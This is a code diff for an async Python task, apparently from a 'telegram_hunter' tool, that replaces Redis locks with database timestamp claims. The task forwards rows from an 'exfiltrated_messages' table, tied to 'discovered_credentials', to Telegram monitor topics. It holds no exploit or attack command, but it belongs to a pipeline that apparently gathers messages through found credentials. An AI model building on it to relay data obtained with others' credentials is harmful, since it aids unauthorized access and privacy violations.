@@ -222,9 +222,24 @@ def broadcast_pending():
             pass # Lock expired or already released
 
 async def _broadcast_logic():
-    # Query pending messages
-    # We want to group by credential_id to send them in order and in correct topic
-    # Limit to 50 to avoid long running tasks
+    """
+    Broadcast pending messages to Telegram topics.
+    Uses DB-level atomic claims to prevent duplicates across ALL environments
+    (Railway, local Docker, local scripts) since they all share the same Supabase DB.
+    """
+    from datetime import datetime, timezone, timedelta
+    from app.core.config import settings
+    
+    # Claim timeout - if a claim is older than this, consider it stale (worker crashed)
+    CLAIM_TIMEOUT_MINUTES = 5
+    stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
+    
+    # Query pending messages that are:
+    # 1. Not broadcasted, AND
+    # 2. Either unclaimed (broadcast_claimed_at IS NULL) OR claim is stale (> 5 min old)
+    # 
+    # NOTE: Supabase doesn't support complex OR conditions easily via Python client.
+    # So we'll fetch unclaimed messages and check claim freshness in Python.
     response = db.table("exfiltrated_messages")\
         .select("*, discovered_credentials!inner(meta)")\
         .eq("is_broadcasted", False)\
@@ -236,38 +251,68 @@ async def _broadcast_logic():
     if not messages:
         return "No pending broadcasts."
 
-    from app.core.config import settings
     group_id = settings.MONITOR_GROUP_ID
-
     sent_count = 0
     skipped_count = 0
+    already_done_count = 0
     # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
     cached_topic_ids = {}
-    
-    # ==============================================
-    # REDIS-BASED CLAIMS (crash-safe with TTL)
-    # ==============================================
-    # Each message gets a Redis key with 5-minute TTL
-    # If worker crashes, keys expire and messages are retried
-    # If send succeeds, we mark DB and delete key
-    CLAIM_TTL = 300  # 5 minutes
 
     for msg in messages:
         msg_id = msg["id"]
-        claim_key = f"telegram_hunter:broadcast_claim:{msg_id}"
         
         try:
-            # ==============================================
-            # TRY TO CLAIM THIS MESSAGE (atomic, crash-safe)
-            # ==============================================
-            # SETNX returns True only if key didn't exist
-            # TTL ensures auto-expiry if worker crashes
-            claimed = redis_client.set(claim_key, "1", nx=True, ex=CLAIM_TTL)
+            # ==========================================================
+            # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
+            # ==========================================================
+            # We use a two-step approach:
+            # 1. Check current state of the message
+            # 2. Only update if still valid to claim
             
-            if not claimed:
-                # Another worker/run already claimed this message
-                skipped_count += 1
+            # First, get fresh state from DB
+            fresh = db.table("exfiltrated_messages")\
+                .select("is_broadcasted, broadcast_claimed_at")\
+                .eq("id", msg_id)\
+                .single()\
+                .execute()
+            
+            if not fresh.data:
+                print(f"    ⚠️ Message {msg_id} not found in DB, skipping")
                 continue
+            
+            # Check if already broadcasted (another worker completed it)
+            if fresh.data.get("is_broadcasted"):
+                already_done_count += 1
+                continue
+            
+            # Check if claimed by another worker recently
+            claimed_at = fresh.data.get("broadcast_claimed_at")
+            if claimed_at:
+                # Parse timestamp and check if stale
+                try:
+                    if isinstance(claimed_at, str):
+                        claimed_time = datetime.fromisoformat(claimed_at.replace('Z', '+00:00'))
+                    else:
+                        claimed_time = claimed_at
+                    
+                    if claimed_time > stale_threshold:
+                        # Claim is fresh - another worker is handling this
+                        skipped_count += 1
+                        continue
+                    else:
+                        print(f"    🔄 Stale claim detected for {msg_id}, reclaiming...")
+                except Exception as e:
+                    print(f"    ⚠️ Error parsing claimed_at for {msg_id}: {e}")
+            
+            # Claim this message by setting claimed_at to NOW
+            claim_time = datetime.now(timezone.utc).isoformat()
+            db.table("exfiltrated_messages")\
+                .update({"broadcast_claimed_at": claim_time})\
+                .eq("id", msg_id)\
+                .eq("is_broadcasted", False)\
+                .execute()
+            
+            print(f"    📌 Claimed message {msg_id}")
             
             cred_id = msg["credential_id"]
             # Extract meta from the joined discovered_credentials
@@ -351,29 +396,42 @@ async def _broadcast_logic():
             
             if send_success:
                 # ==============================================
-                # SUCCESS: Mark in DB and keep Redis key (auto-expires)
+                # SUCCESS: Mark as broadcasted and clear claim
                 # ==============================================
-                db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg_id).execute()
+                db.table("exfiltrated_messages").update({
+                    "is_broadcasted": True,
+                    "broadcast_claimed_at": None  # Clear claim
+                }).eq("id", msg_id).execute()
                 sent_count += 1
                 print(f"    ✅ Broadcasted msg {msg_id}")
             else:
                 # ==============================================
-                # FAILED: Delete Redis claim so it can be retried
+                # FAILED: Clear claim so it can be retried
                 # ==============================================
-                redis_client.delete(claim_key)
+                db.table("exfiltrated_messages").update({
+                    "broadcast_claimed_at": None
+                }).eq("id", msg_id).execute()
+                print(f"    🔄 Cleared claim for retry: {msg_id}")
             
             # Rate limit
             await asyncio.sleep(2.0) 
 
         except Exception as e:
             print(f"Error broadcasting msg {msg_id}: {e}")
-            # Delete claim on error so message can be retried
-            redis_client.delete(claim_key)
+            # Clear claim on error so message can be retried
+            try:
+                db.table("exfiltrated_messages").update({
+                    "broadcast_claimed_at": None
+                }).eq("id", msg_id).execute()
+            except:
+                pass  # Best effort cleanup
             continue
     
     result = f"Broadcasted {sent_count}/{len(messages)} messages"
     if skipped_count > 0:
-        result += f" (skipped {skipped_count} already claimed)"
+        result += f" (skipped {skipped_count} claimed by other workers)"
+    if already_done_count > 0:
+        result += f" (already done: {already_done_count})"
     return result
 
 @app.task(name="flow.system_heartbeat")
